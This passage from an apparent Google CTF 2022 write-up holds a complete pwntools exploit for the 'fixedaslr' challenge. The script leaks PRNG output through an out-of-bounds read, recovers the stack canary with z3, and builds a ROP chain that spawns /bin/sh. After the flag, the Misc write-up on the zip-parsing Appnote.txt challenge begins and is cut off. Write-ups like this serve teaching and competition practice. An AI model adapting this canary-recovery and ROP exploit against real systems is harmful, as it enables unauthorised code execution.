<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Helper method to execute the OOB bug</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">oob</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;see (0-9)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;score: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Helper method to put our score into the scoreboard</span>
</span></span><span class="line"><span class="cl"><span class="c1"># and put our BOF payload</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">play</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;How much is &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; ?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">ans</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Question-</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s1">: </span><span class="si">{</span><span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s1"> = </span><span class="si">{</span><span class="n">ans</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;How much is &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; ?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ans</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">out</span><span class="p">)</span><span class="o">+</span><span class="mi">5</span> <span class="c1"># Make it false</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Question-</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="si">}</span><span class="s1">: </span><span class="si">{</span><span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s1"> = </span><span class="si">{</span><span class="n">ans</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;(0-31)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;your name:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./loader&#39;</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="p">{})</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;fixedaslr.2022.ctfcompetition.com&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">Recover the rand_state during the first rand() call of aslr_get_addr,
</span></span></span><span class="line"><span class="cl"><span class="s1">which equivalent to the canary value set by init_stack_guard method.
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">We use the OOB bug on scoreboard. Notes that we can only recover
</span></span></span><span class="line"><span class="cl"><span class="s1">6 of rand() result of the aslr_get_addr method. Each rand() return
</span></span></span><span class="line"><span class="cl"><span class="s1">12-bit number, which is used as the first 12-bits of each address
</span></span></span><span class="line"><span class="cl"><span class="s1">those used by each object file in this challenge.
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">known_states</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Inspecting via gdb, offset 512 will give us the 1st rand()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># result of the aslr_get_addr (taking the first 12-bits only)</span>
</span></span><span class="line"><span class="cl"><span class="n">base_1</span> <span class="o">=</span> <span class="n">oob</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">512</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">known_states</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">base_1</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Inspecting via gdb, offset -1017 will give us the 3rd rand()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># result of the aslr_get_addr (taking the first 12-bits only)</span>
</span></span><span class="line"><span class="cl"><span class="n">known_states</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">oob</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="o">-</span><span class="mi">1017</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Inspecting via gdb, offset -1019 will give us the 5th rand()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># result of the aslr_get_addr (taking the first 12-bits only)</span>
</span></span><span class="line"><span class="cl"><span class="n">base_5</span> <span class="o">=</span> <span class="n">oob</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="o">-</span><span class="mi">1019</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">known_states</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">base_5</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Inspecting via gdb, one of the address in region started with the 5th result</span>
</span></span><span class="line"><span class="cl"><span class="c1"># of the rand() contains an address which the first 12-bits is</span>
</span></span><span class="line"><span class="cl"><span class="c1"># the result of the 4th rand()</span>
</span></span><span class="line"><span class="cl"><span class="n">offset_4</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(((</span><span class="n">base_5</span><span class="o">-</span><span class="mh">0x1000</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="n">base_1</span><span class="o">-</span><span class="mh">0x60</span><span class="p">))</span> <span class="o">//</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">offset_4</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">offset_4</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span> <span class="o">+</span> <span class="n">offset_4</span>
</span></span><span class="line"><span class="cl"><span class="n">base_4</span> <span class="o">=</span> <span class="n">oob</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">offset_4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">known_states</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">base_4</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Inspecting via gdb, one of the address in region started with the 5th result</span>
</span></span><span class="line"><span class="cl"><span class="c1"># of the rand() also contains an address which the first 12-bits is</span>
</span></span><span class="line"><span class="cl"><span class="c1"># the result of the 6th rand()</span>
</span></span><span class="line"><span class="cl"><span class="n">offset_6</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(((</span><span class="n">base_5</span><span class="o">+</span><span class="mh">0x1000</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="n">base_1</span><span class="o">-</span><span class="mh">0x60</span><span class="p">))</span> <span class="o">//</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">offset_6</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">offset_6</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span> <span class="o">+</span> <span class="n">offset_6</span>
</span></span><span class="line"><span class="cl"><span class="n">base_6</span> <span class="o">=</span> <span class="n">oob</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">offset_6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">known_states</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">base_6</span> <span class="o">&gt;&gt;</span> <span class="mi">28</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Inspecting via gdb, one of the address in region started with the 4th result</span>
</span></span><span class="line"><span class="cl"><span class="c1"># of the rand() also contains an address which the first 12-bits is</span>
</span></span><span class="line"><span class="cl"><span class="c1"># the result of the 2nd rand()</span>
</span></span><span class="line"><span class="cl"><span class="n">offset_2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(((((</span><span class="n">base_4</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="n">base_1</span><span class="o">-</span><span class="mh">0x60</span><span class="p">))</span> <span class="o">//</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">base_2</span> <span class="o">=</span> <span class="n">oob</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">offset_2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">known_states</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">base_2</span>  <span class="o">&gt;&gt;</span> <span class="mi">28</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now we have 6 consecutives rand() result, we will try to recover</span>
</span></span><span class="line"><span class="cl"><span class="c1"># the rand_state before the first rand(), which equivalents to</span>
</span></span><span class="line"><span class="cl"><span class="c1"># the binary canary value.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We use z3 to solve it.</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Known states: </span><span class="si">{</span><span class="n">known_states</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rand_state</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s2">&#34;x&#34;</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rand_extract_bit</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">rand_state</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">rand_state</span> <span class="o">&gt;&gt;</span> <span class="n">a</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rand_get_bit</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">rand_state</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mh">0x3F</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">^</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mh">0x3D</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">^</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mh">0x3C</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">^</span> <span class="n">rand_extract_bit</span><span class="p">(</span><span class="mh">0x3A</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">^</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rand_state</span> <span class="o">=</span> <span class="p">((</span><span class="n">rand_state</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="p">))</span> <span class="o">|</span> <span class="n">x</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">x</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rand</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">y</span> <span class="o">=</span> <span class="n">rand_get_bit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="n">y</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">x</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">known_state</span> <span class="ow">in</span> <span class="n">known_states</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span> <span class="o">==</span> <span class="n">known_state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">recovered_canary</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">model</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">recovered_canary</span> <span class="o">=</span> <span class="n">model</span><span class="p">[</span><span class="n">BitVec</span><span class="p">(</span><span class="s2">&#34;x&#34;</span><span class="p">,</span> <span class="mi">64</span><span class="p">)]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Recovered canary: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">recovered_canary</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now we have recovered the canary (rand_state), let&#39;s calculate</span>
</span></span><span class="line"><span class="cl"><span class="c1"># the address of the 7th rand() result. Inspecting via gdb, this</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 7th address contains a lot of useful gadgets.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Recover 7th address</span>
</span></span><span class="line"><span class="cl"><span class="n">rand_state</span> <span class="o">=</span> <span class="n">recovered_canary</span>
</span></span><span class="line"><span class="cl"><span class="n">base_addr7</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">base_addr7</span> <span class="o">=</span> <span class="n">rand</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">base_addr7</span> <span class="o">=</span> <span class="p">(</span><span class="n">base_addr7</span> <span class="o">&lt;&lt;</span> <span class="mi">28</span><span class="p">)</span><span class="o">+</span><span class="mh">0x1000</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Base Addr 7th: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr7</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Gadgets from the 7th address region (Gadget can be inspected via gdb)</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">base_addr7</span><span class="o">+</span><span class="mh">0x1</span> <span class="c1"># pop rdi; ret;</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">base_addr7</span><span class="o">+</span><span class="mh">0x4</span> <span class="c1"># pop rsi; ret;</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span> <span class="o">=</span> <span class="n">base_addr7</span><span class="o">+</span><span class="mh">0x7</span> <span class="c1"># pop rax; ret;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Gadgets from the 2nd address region (Gadget can be inspected via gdb)</span>
</span></span><span class="line"><span class="cl"><span class="n">base_addr2</span> <span class="o">=</span> <span class="p">((</span><span class="n">base_2</span><span class="o">&gt;&gt;</span><span class="mi">8</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="n">base_addr2</span><span class="o">+</span><span class="mh">0x2</span> <span class="c1"># syscall;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now we know the canary, we just need to build ROP Chain to exploit</span>
</span></span><span class="line"><span class="cl"><span class="c1"># the BOF bug that we found during setting our name in the scoreboard.</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">base_1</span> <span class="o">+</span> <span class="mh">0x100</span> <span class="c1"># We will put /bin/sh\x00 string into the scoreboard name (which is in base_1+0x100)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;/bin/sh addr: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># BOF payload</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Overwrite saved rbp</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - pop bin_sh_addr to rdi. Now rdi contain pointer to b&#39;/bin/sh\x00&#39; string</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - pop null to rsi</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - pop 0x3b (execve) to rax</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - call syscall</span>
</span></span><span class="line"><span class="cl"><span class="n">bof_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">bof_payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">min_score</span> <span class="o">=</span> <span class="mi">60</span><span class="o">//</span><span class="mi">5</span> <span class="c1"># Score to get to the scoreboard</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># What this payload do:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Set /bin/sh\x00 as the start of our name. This will be used by our ROP chain as our execve args.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Pad it with 0x20 of &#39;a&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Put our leaked canary, so that the stack smashing check is passed.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># - Overwrite saved rbp of the previous call &amp; return address with our BOF payload</span>
</span></span><span class="line"><span class="cl"><span class="n">play</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">min_score</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x68732f6e69622f</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">recovered_canary</span><span class="p">)</span><span class="o">+</span><span class="n">bof_payload</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the snapshot of the script result 😄
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/z6FznJI.png"
        data-srcset="https://i.imgur.com/z6FznJI.png, https://i.imgur.com/z6FznJI.png 1.5x, https://i.imgur.com/z6FznJI.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/z6FznJI.png"
        title="https://i.imgur.com/z6FznJI.png" /></p>
<blockquote>
<p>Flag: <code>CTF{GuessYouCanSayTheCookieGotRandomlyBroken}</code></p>
</blockquote>
<h1 id="misc">Misc</h1>
<h2 id="appnotetxt">Appnote.txt</h2>
<blockquote>
<p>Every single archive manager unpacks this to a different file&hellip;</p>
</blockquote>
<h3 id="analysis--solution">Analysis &amp; Solution</h3>
<p>We were given a zip file called <code>dump.zip</code>. Trying to extract it, I found that the size of the file&rsquo;s output doesn&rsquo;t make sense. So, let&rsquo;s try to open it in a hex editor.</p>
<p>Turn out, as you can see, there are a lot of zip files on there. What makes it more interesting is there are a lot of zip files with the same name (Example: there is a lot of <code>flag00.zip</code> in the file), but with different contents. There are flag00.zip - flag18.zip. Each zip file with the same name contains only one char. In fact, the name indicates the n-th character of the flags. So, with deduction, we can guess that:</p>
<ul>
